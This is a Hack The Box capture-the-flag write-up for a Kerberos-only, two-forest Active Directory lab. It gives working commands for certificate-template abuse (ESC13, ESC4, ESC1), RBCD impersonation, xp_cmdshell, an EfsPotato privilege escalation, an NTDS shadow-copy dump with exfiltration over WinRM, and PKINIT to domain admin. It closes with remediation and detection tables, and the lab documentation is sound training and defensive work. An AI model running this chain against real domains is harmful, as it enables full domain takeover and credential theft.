# 🏓 PINGPONG: Full Writeup

**Platform:** Hack The Box (Season 10, weekly) · **Difficulty:** Hard
**Type:** Dual-forest Active Directory (Kerberos-only, no NTLM)
**Targets:**
- User flag: `C:\Users\C.Carlssen\Desktop\user.txt` on DC2 (PONG.HTB), readable with SYSTEM on DC2 (post-EfsPotato)
- Root flag: `C:\Users\Administrator\Desktop\root.txt` on DC1 (PING.HTB)

**Result:** both domains compromised (DA of PING and PONG).

> Honest writeup: the path into PONG is original to this resolution. The closing move in PING used an external hint (public writeup of the box) that was later verified and demonstrated with our own method (see "Second pass"). Details in the honesty section.

---

## Table of contents
1. [Executive summary](#executive-summary)
2. [Lab architecture](#lab-architecture)
3. [Timeline](#timeline)
4. [Phase 1: Foothold in PING (ESC13 → WinRM)](#phase-1-foothold-in-ping-esc13--winrm)
5. [Phase 2: PONG, the original path (RBCD + SQL + EfsPotato → DA)](#phase-2-pong-the-original-path-rbcd--sql--efspotato--da)
6. [Phase 3: Root flag in PING (cross-forest DACL → ESC4 → ESC1 → PKINIT)](#phase-3-root-flag-in-ping-cross-forest-dacl--esc4--esc1--pkinit)
7. [Second pass: the path with our own method](#second-pass-the-path-with-our-own-method)
8. [Severity (approximate CVSS per phase)](#severity-approximate-cvss-per-phase)
9. [Remediation](#remediation)
10. [Detection (blue team)](#detection-blue-team)
11. [Lessons](#lessons)
12. [Honesty](#honesty)

---

## Executive summary

Two forests. One trust. Zero NTLM. A clock that lives in the future. This lab will make you question your SPNs, your certipy flags and your life choices.

PingPong is a dual-forest AD lab: a bidirectional trust between **PING.HTB** (DC1, external entry point) and **PONG.HTB** (DC2, internal only). NTLM is disabled in both domains, so every authentication is pure Kerberos. The lab clock runs about 8 hours ahead of UTC, which forces clock compensation (`faketime`) on every Kerberos operation. RC4 is disabled in PONG (AES256 keys mandatory).

The full chain:

```
c.roberts (PING)
  → ESC13 TemporaryWinRM → WinRM on DC1
  → pivot to PONG (original path: gMSA RBCD + SQL NetBIOS SPN)
  → xp_cmdshell (svc_sql) → EfsPotato → SYSTEM on DC2
  → shadow copy + NTDS → DA PONG
  → R.Martinelli (PONG) is a member (via FSP) of the custom "CA Managers" group of PING,
    which holds WriteDacl over SmartcardAuthentication
  → ESC4 on SmartcardAuthentication → ESC1 (Administrator@ping.htb certificate)
  → PKINIT → DA PING → root flag
```

## Lab architecture

| Item | Detail |
|---|---|
| PING.HTB | DC1: dc1.ping.htb, dual-homed: variable external IP + 192.168.2.1 (internal network) |
| PONG.HTB | DC2: dc2.pong.htb (192.168.2.2, internal only) |
| Trust | Bidirectional forest trust |
| NTLM | Disabled in both (Kerberos-only) |
| RC4 | Disabled in PONG (AES256) |
| Clock | ~8h ahead (relative faketime: `+8 hours`) |
| Key accounts | c.roberts (foothold), C.Carlssen (GenericWrite over svc_sql, user flag), C.Adam (SQL sysadmin), R.Martinelli (FSP in PING's "CA Managers" group) |

## Timeline

| Date | Milestone |
|---|---|
| 2026-08-23 | Initial enumeration of PING/PONG, ESC13 identified |
| 2026-08-24 | PONG credentials, gMSA, first pivot phase |
| 2026-08-28 | SQL NetBIOS SPN, RBCD, SQL sysadmin, EfsPotato, SYSTEM on DC2, NTDS |
| 2026-08-29 | DA PONG, user flag, root flag hunt, ESC4/ESC1/PKINIT close, root flag |

---

## Phase 1: Foothold in PING (ESC13 → WinRM)

Assume-breach scenario: `c.roberts` (IT group) with a known password.

```bash
# 1. TGT for c.roberts (clock compensation always)
TZ=UTC KRB5_CONFIG=krb5.conf faketime "+8 hours" \
  getTGT.py 'ping.htb/c.roberts:<REDACTED>' -dc-ip <DC1_IP>

# 2. Enumerate ADCS
KRB5CCNAME=c.roberts.ccache faketime "+8 hours" \
  certipy find -u c.roberts@ping.htb -k -no-pass -dc-ip <DC1_IP> -target dc1.ping.htb -vulnerable -stdout
```

Finding: the **TemporaryWinRM** template has an issuance policy (OID) linked to the **TempWinRMAccess** group. That is **ESC13**: when authenticating via PKINIT with a certificate from that template, the KDC injects the group membership into the PAC (the group linked to the OID must be universal in scope).

```bash
# 3. Enroll the certificate and get the PKINIT TGT (the one carrying the membership)
certipy req -u c.roberts@ping.htb -k -no-pass -ca ping-DC1-CA \
  -template TemporaryWinRM -target dc1.ping.htb
certipy auth -pfx c.roberts.pfx -username c.roberts -domain ping.htb
```

**Detail that cost us time:** the WinRM service on DC1 does **not** use the `HTTP/dc1.ping.htb` SPN; it uses **`WSMAN/dc1.ping.htb`** (the SPN of the DC1$ account, confirmed empirically: with the correct ticket we got a WinRM shell). Requesting tickets with another service class (HTTP/cifs) does not produce a usable ticket for the service and authentication fails.

```bash
KRB5CCNAME=c.roberts.ccache getST.py -k -no-pass -spn WSMAN/dc1.ping.htb 'ping.htb/c.roberts'
# WinRM (client with service="WSMAN")
```

## Phase 2: PONG, the original path (RBCD + SQL + EfsPotato → DA)

*This half is original to this resolution; it does not come from any writeup.*

> Pivot note: the initial jump from PING to PONG (obtaining C.Carlssen's credentials) happened during the earlier enumeration phase: c.roberts' FSP was added to PONG's gMSA Managers group (group scope change) to read the gMSA `msDS-ManagedPassword`, and the JEA endpoint on DC2 leaked the PowerShell history with C.Carlssen's password. This resolution continues from C.Carlssen with RBCD + SQL.

### 2.1 The SQL NetBIOS SPN

Empirical observation of this lab: DC2's SQL Server 2022 Express instance (default instance, MSSQLSERVER service) rejected TGS with the FQDN SPN (`MSSQLSvc/dc2.pong.htb:1433`) with "Login failed. The login is from an untrusted domain and cannot be used with Windows authentication." (error 18452) five times, and accepted the TGS with the **NetBIOS** SPN (`MSSQLSvc/DC2:1433`) that the `svc_sql` account registers when TCP is enabled. Lesson: check which SPN the service actually registered before assuming the FQDN.

The fix was two-fold:

1. Add the NetBIOS SPN to the `svc_sql` account (modification of the `servicePrincipalName` attribute via S.DS.P). The permission came from **C.Carlssen**, who has GenericWrite over `svc_sql` (the same permission enabled the gMSA RBCD).
2. Obtain a NetBIOS TGS for **C.Adam** (member of Database Admins = SQL sysadmin) using the gMSA RBCD + S4U2Proxy.

```bash
# TGT for the gMSA (the AES256 key comes from the msDS-ManagedPassword blob)
getTGT.py 'pong.htb/Pong_gMSA$' -aesKey <AES256_GMSA> -dc-ip 127.0.0.1

# TGS for C.Adam to MSSQLSvc/DC2:1433 via S4U2Proxy, authenticated with gMSA keys
KRB5CCNAME=Pong_gMSA$.ccache getST.py -k -no-pass -spn MSSQLSvc/DC2:1433 -impersonate C.Adam \
  'pong.htb/Pong_gMSA$'
# /etc/hosts: 127.0.0.1 DC2  (so the target builds the NetBIOS SPN)
mssqlclient.py -k -no-pass -dc-ip 127.0.0.1 'pong.htb/C.Adam@DC2'
```

### 2.2 From SQL sysadmin to SYSTEM

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');      -- 1
EXEC xp_cmdshell 'whoami';                -- pong\svc_sql
```

`svc_sql` is not a local admin, but it has **SeImpersonatePrivilege**. With no binary transfer possible (outbound HTTP and SMB blocked), the **EfsPotato** exploit was compiled on the host itself:

1. Source delivered in base64 chunks via `xp_cmdshell` → `certutil -decode`.
2. Compiled with `csc.exe` from the .NET Framework (C:\Windows\Temp is denied for the service account; use `C:\ProgramData\efs\`).
3. Execute: `efs.exe "<cmd>"` (no `-c` flag, `lsarpc` pipe by default) → **NT AUTHORITY\SYSTEM**.

### 2.3 NTDS dump and exfiltration

```bash
vssadmin create shadow /for=C:          # note the shadow copy GUID
vssadmin list shadows                   # get the HarddiskVolumeShadowCopy<N> name
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\ntds.dit C:\ProgramData\efs\ntds.dit
reg save HKLM\SYSTEM C:\ProgramData\efs\SYSTEM
reg save HKLM\SECURITY C:\ProgramData\efs\SECURITY
```

SMB and HTTP were dead. Two separate problems with the WinRM tooling: evil-winrm 3.9 broken (winrm gem 2.3.9 bug with ruby 3.4) and the ruby gssapi without AES ticket support. Exfiltration was done with **chunked WinRM** using the ruby client against DC2 (C.Carlssen RC4 tickets): `MaxEnvelopeSizekb` was raised to 8192 and the file was read in 4 MB ranges with a PowerShell script, base64-decoded on the attacker side. With `secretsdump -ntds -system -security LOCAL` we got **DA PONG**: Administrator, krbtgt, 20 accounts and the trust key. Bonus: the SECURITY hive revealed the SQL service password in clear text (LSA secret `_SC_MSSQLSERVER`).

## Phase 3: Root flag in PING (cross-forest DACL → ESC4 → ESC1 → PKINIT)

The root flag lives on the Desktop of PING's Administrator, not PONG's. The final move: a PONG account, **R.Martinelli**, is a member (via Foreign Security Principal) of PING's custom **"CA Managers"** group, which holds a **WriteDacl/WriteOwner ACE over the SmartcardAuthentication template**. His AES256 key came from PONG's NTDS.

### 3.1 R.Martinelli cross-realm tickets

```bash
getTGT.py 'pong.htb/r.martinelli' -aesKey <AES256_RMARTINELLI> -dc-ip 127.0.0.1
getST.py -k -no-pass -spn 'krbtgt/PING.HTB@PING.HTB' 'pong.htb/r.martinelli'
kvno -S ldap dc1.ping.htb
# merge ccaches: TGT + referral + ldap TGS into a single file
```

With the merged ccache, the **LDAP GSSAPI cross-forest bind** against dc1.ping.htb works. The mechanism: R.Martinelli's native SID (not SIDHistory) is represented in PING via a **Foreign Security Principal**, and that FSP was added to the custom **CA Managers** group. The trust's SID filtering (which only filters SIDHistory) does not apply here; membership is evaluated normally against the FSP.

### 3.2 ESC4: modify SmartcardAuthentication

The "CA Managers" group holds WriteDacl/WriteOwner over the template, so R.Martinelli (member via FSP) can modify it:

```bash
# 1. Modify the template flags (LDAP GSSAPI cross-forest bind as R.Martinelli):
#    ldap3 modify of the SmartcardAuthentication template (DN below)
#      msPKI-Certificate-Name-Flag = 1   (ENROLLEE_SUPPLIES_SUBJECT)
#      msPKI-Enrollment-Flag = 0

# 2. Grant enrollment/control to c.roberts over the template:
bloodyAD add genericAll \
  'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
  'S-1-5-21-750635624-2058721901-1932338391-2617'   # c.roberts
```

Infrastructure notes: `bloodyAD` uses dnspython and does not read `/etc/hosts`; a temporary resolv.conf pointing to the DC1 nameserver was used. The CA enrollment goes through the chisel SOCKS (proxychains + temporary hosts entry `192.168.2.1 dc1.ping.htb`), because DC1's port 135 is filtered from the outside.

### 3.3 ESC1: Administrator certificate

```bash
certipy req -u c.roberts@ping.htb -k -no-pass -ca ping-DC1-CA \
  -template SmartcardAuthentication \
  -upn 'Administrator@ping.htb' \
  -sid 'S-1-5-21-750635624-2058721901-1932338391-500'   # the USER's objectSID
```

The `-sid` must be the **user's objectSID** (500), not the Domain Admins group SID (512). KB5014754 strong mapping requires UPN and SID to point to the same object.

### 3.4 PKINIT → DA of PING

```bash
certipy auth -pfx administrator.pfx -username administrator -domain ping.htb
getST.py -k -no-pass -spn WSMAN/dc1.ping.htb 'ping.htb/administrator'
# WinRM → whoami → ping\administrator (Domain Admins)
# type C:\Users\Administrator\Desktop\root.txt
```

---

## Second pass: the path with our own method

> Methodological post-mortem: Phase 3 describes the executed attack; this section proves the same vector was visible with systematic enumeration. It is not a duplicate finding, it is a reproducibility check.

1. **NTDS inventory of PONG**: every account with its SID (R.Martinelli = `S-1-5-21-2410575906-3092493790-2123333151-1124`).
2. **DACLs of PING's templates**: `SmartcardAuthentication` has a **WriteDacl/WriteOwner** ACE for the **"CA Managers"** group (RID 2627), a custom group, immediately suspicious.
3. **"CA Managers" members**: includes the **Foreign Security Principal** of R.Martinelli from PONG.
4. R.Martinelli's native SID (represented by the FSP) is evaluated normally against the group in PING: he is an effective member of CA Managers → WriteDacl over the template → ESC4 → ESC1 → DA.

The signature to look for in this kind of lab: **custom groups whose members include FSPs from other domains**.

---

## Severity (approximate CVSS per phase)

| Phase | Vector | Severity | Approx. CVSS |
|---|---|---|---|
| ESC13 (TemporaryWinRM) | ADCS privilege escalation with PAC group injection | High | 8.8 |
| RBCD + GenericWrite over svc_sql + SQL sysadmin | Full compromise of PONG domain | Critical | 9.8 |
| EfsPotato (SeImpersonate) | SYSTEM on DC2 | High | 7.8 |
| FSP in "CA Managers" + ESC4 + ESC1 | Full compromise of PING domain via trust | Critical | 9.8 |

> Context estimates for a training lab, not a formal assessment.

## Remediation

| Finding | Remediation |
|---|---|
| ESC13 TemporaryWinRM | Remove the issuance policy link from the template to the group, or restrict enrollment to required accounts |
| ESC4/ESC1 SmartcardAuthentication | Remove WriteDacl/WriteOwner from non-privileged groups ("CA Managers") and restore `msPKI-Certificate-Name-Flag` (no ENROLLEE_SUPPLIES_SUBJECT) |
| GenericWrite over svc_sql | Audit ACEs over service accounts; least privilege |
| FSPs in local groups | Review Foreign Security Principals in groups with permissions over sensitive infrastructure (ADCS) |
| Service SPNs | Verify the actually registered SPNs (`setspn -L`) and monitor changes |
| KB5014754 | Enforce strict strong mapping (prevents UPN/SAN mismatch in PKINIT) |

## Detection (blue team)

| Activity | Detection source |
|---|---|
| `servicePrincipalName` modification (added NetBIOS SPN) | LDAP attribute change events |
| TGS requests with `msDS-AllowedToActOnBehalfOfOtherIdentity` | Event 4769 with S4U flags |
| `xp_cmdshell` enable + execution | SQL Server events / process auditing |
| `vssadmin create shadow` + NTDS reads | Event 7036 / file access |
| ADCS template modification (ESC4) | Events 4899/4900 (template update) and/or 5136 (DS object modify) |
| Certificate request with foreign UPN/SAN | Event 4886 with UPN mismatch |
| PKINIT of an account with a freshly issued certificate | Event 4768 with cert info |
| `MaxEnvelopeSizekb` raised in WSMAN | Service configuration change |

## Lessons

1. **Service SPNs on Server 2022**: WinRM uses `WSMAN/<fqdn>`; verify the actual SPN existence before blaming Kerberos.
2. **Cross-forest with FSPs**: a foreign account's native SID represented as a Foreign Security Principal and added to a local group is evaluated normally (SID filtering only filters SIDHistory, it does not apply here).
3. **`certipy find -vulnerable` may miss the cross-forest ESC4**: the principal with WriteDacl is a Foreign Security Principal that does not resolve to the attacker. Look at the DACLs directly and at the members of custom groups.
4. **KB5014754**: in `certipy req`, `-sid` = the user's objectSID (500), not the group SID (512).
5. **The SQL instance (Express, default) validated the NetBIOS SPN of the TGS**, not the FQDN (in this lab). Verify the SPNs the service actually registered.
6. **EfsPotato** worked on this DC2 (Server 2022); compile on the host with `csc.exe` when there is no binary transfer.
7. **`C:\Windows\Temp` denied** for non-admin service accounts: use `C:\ProgramData`.
8. **Environment variables ALWAYS before `faketime`**: `VAR=x faketime "+8 hours" cmd`.
9. **Ruby gssapi does not handle AES tickets**: use libkrb5 (curl/kvno) or RC4 when the KDC allows it.
10. **bloodyAD uses dnspython**, not `/etc/hosts`: temporary resolv.conf with the DC nameserver.

## Honesty

- **100% ours:** the full path into PONG (NetBIOS SPN, RBCD, EfsPotato on host, chunked WinRM exfiltration), the `WSMAN/` SPN discovery, all the infrastructure (tunnels, proxychains, ccache merging, cross-forest LDAP flow), the user flag, DA PONG.
- **External hint (public writeup of the box, granted after hours):** that R.Martinelli was the key to the ending. The data was in our own files (PONG's NTDS) and was later verified with our own method (CA Managers group + FSP).
- **Self-criticism:** R.Martinelli was dismissed due to an enumeration bias ("no groups/SPNs") without checking cross-forest permissions; the cross-realm was written off because of service-side SID filtering without testing the living variant (FSPs in groups/DACLs); the NTDS cross-forest inventory was missing.

**Permanent lesson:** after dumping an NTDS, inventory the cross-forest permissions of every account. Custom groups with FSPs from other domains are the lab's signature.

---

*Solved by Camarón 🦐 with the endurance of his father. Written with EMET, Anavah and Tiferet.*
